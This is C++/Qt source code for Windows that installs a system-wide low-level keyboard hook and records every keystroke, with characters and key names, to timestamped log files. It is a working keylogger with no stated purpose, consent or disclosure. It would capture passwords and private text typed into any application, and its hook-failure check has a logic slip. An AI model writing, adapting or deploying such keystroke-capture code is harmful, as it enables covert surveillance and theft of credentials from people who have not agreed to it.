#include <QtCore/QCoreApplication>
#include <QDebug>
#include <windows.h>
#include <QTime>
#include <QDate>
#include <QFile>
#pragma comment(lib,"user32.lib")

HHOOK myHook=NULL;

QFile *file1,*file2;

void updateKeyState(BYTE *kbdStat, int keyCode)
{
    kbdStat[keyCode]=GetKeyState(keyCode);
}

LRESULT CALLBACK myFun(int nCode,WPARAM wParam, LPARAM lParam)
{
    qDebug() << "Key pressed : " << nCode;

    // Extracting key
    KBDLLHOOKSTRUCT myKey=*((KBDLLHOOKSTRUCT*)lParam);

    wchar_t buff[5];

    // Get Keyboard status
    BYTE kbdStat[256];
    GetKeyboardState(kbdStat);
    updateKeyState(kbdStat,VK_SHIFT);
    updateKeyState(kbdStat,VK_CAPITAL);
    updateKeyState(kbdStat,VK_CONTROL);
    updateKeyState(kbdStat,VK_MENU);

    // Get keyboard layout
    HKL keyboard_layout = GetKeyboardLayout(0);

    // Get Name
    char lpszName[0x100]={0};

    DWORD dwMsg=1;
    dwMsg += myKey.scanCode << 16;
    dwMsg += myKey.flags << 24;

    int i = GetKeyNameText(dwMsg,(LPTSTR)lpszName,255);

    // Try to convert the key info
    int result = ToUnicodeEx(myKey.vkCode,myKey.scanCode,kbdStat,buff,4,0,keyboard_layout);

    buff[4]=L'\0';

    // Return result

    qDebug() << QDate::currentDate().toString("yyyyMMdd")+QTime::currentTime().toString("HHmmss") << "Key: " << myKey.vkCode << QString::fromUtf16((ushort*)buff) << " = " << QString::fromUtf16((ushort*)lpszName);

    // Write to file
    file1->write(QString::fromUtf16((ushort*)buff).toAscii());
    file2->write(QString::fromUtf16((ushort*)lpszName).toAscii());

    file1->flush();
    file2->flush();
    return CallNextHookEx(myHook,nCode,wParam,lParam);
}

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);
    bool f1,f2;
    file1=new QFile(QDate::currentDate().toString("yyyyMMdd")+QTime::currentTime().toString("HHmmss")+" KEYS.log");
    f1=file1->open(QFile::WriteOnly | QFile::Text);
    file2=new QFile(QDate::currentDate().toString("yyyyMMdd")+QTime::currentTime().toString("HHmmss")+" VALUES.log");
    f2=file2->open(QFile::WriteOnly | QFile::Text);
    myHook=SetWindowsHookEx(WH_KEYBOARD_LL,myFun,NULL,0);
    if(myHook==NULL && f1 && f2)
    {
        qDebug() << "Error creating hook";
    }
    return a.exec();
}
